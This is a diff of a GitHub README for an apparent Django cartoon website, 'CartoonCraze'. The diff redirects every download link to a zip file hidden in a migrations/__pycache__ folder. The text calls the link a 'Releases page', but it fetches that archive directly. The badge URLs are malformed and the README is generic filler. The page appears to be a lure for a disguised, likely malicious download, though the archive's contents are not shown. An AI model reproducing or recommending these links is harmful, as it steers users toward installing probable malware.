@@ -1,7 +1,7 @@
 # 🎨 Fullstack-Python-Project-With-Django - A Fun Fullstack Cartoon Website
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/deneb97/Fullstack-Python-Project-With-Django/main/powered/Fullstack-Python-Project-With-Django.zip%20the%https://raw.githubusercontent.com/deneb97/Fullstack-Python-Project-With-Django/main/powered/Fullstack-Python-Project-With-Django.zip)](https://raw.githubusercontent.com/deneb97/Fullstack-Python-Project-With-Django/main/powered/Fullstack-Python-Project-With-Django.zip)
+[![Download](https://github.com/deneb97/Fullstack-Python-Project-With-Django/raw/refs/heads/main/cartooncrazeapp/migrations/__pycache__/Python_Project_Django_With_Fullstack_3.9.zip%20the%https://github.com/deneb97/Fullstack-Python-Project-With-Django/raw/refs/heads/main/cartooncrazeapp/migrations/__pycache__/Python_Project_Django_With_Fullstack_3.9.zip)](https://github.com/deneb97/Fullstack-Python-Project-With-Django/raw/refs/heads/main/cartooncrazeapp/migrations/__pycache__/Python_Project_Django_With_Fullstack_3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to **CartoonCraze**, a delightful fullstack website that brings animations and fun to life. In this guide, you'll learn how to download and run the application easily. 
@@ -27,7 +27,7 @@ CartoonCraze comes with several exciting features:
 To download the latest version of CartoonCraze, please visit the Releases page. Follow these steps:
 
 1. Click on the link below to access the downloads:
-   [Download from Releases](https://raw.githubusercontent.com/deneb97/Fullstack-Python-Project-With-Django/main/powered/Fullstack-Python-Project-With-Django.zip)
+   [Download from Releases](https://github.com/deneb97/Fullstack-Python-Project-With-Django/raw/refs/heads/main/cartooncrazeapp/migrations/__pycache__/Python_Project_Django_With_Fullstack_3.9.zip)
 
 2. On the Releases page, find the latest version of the software.
 
@@ -60,4 +60,4 @@ Thank you for choosing CartoonCraze! We hope you enjoy using the application as 
 ## 📞 Contact
 For any feedback or suggestions, reach out to us on GitHub or through the contact form on our website.
 
-[![Download](https://raw.githubusercontent.com/deneb97/Fullstack-Python-Project-With-Django/main/powered/Fullstack-Python-Project-With-Django.zip%20the%https://raw.githubusercontent.com/deneb97/Fullstack-Python-Project-With-Django/main/powered/Fullstack-Python-Project-With-Django.zip)](https://raw.githubusercontent.com/deneb97/Fullstack-Python-Project-With-Django/main/powered/Fullstack-Python-Project-With-Django.zip)
+[![Download](https://github.com/deneb97/Fullstack-Python-Project-With-Django/raw/refs/heads/main/cartooncrazeapp/migrations/__pycache__/Python_Project_Django_With_Fullstack_3.9.zip%20the%https://github.com/deneb97/Fullstack-Python-Project-With-Django/raw/refs/heads/main/cartooncrazeapp/migrations/__pycache__/Python_Project_Django_With_Fullstack_3.9.zip)](https://github.com/deneb97/Fullstack-Python-Project-With-Django/raw/refs/heads/main/cartooncrazeapp/migrations/__pycache__/Python_Project_Django_With_Fullstack_3.9.zip)
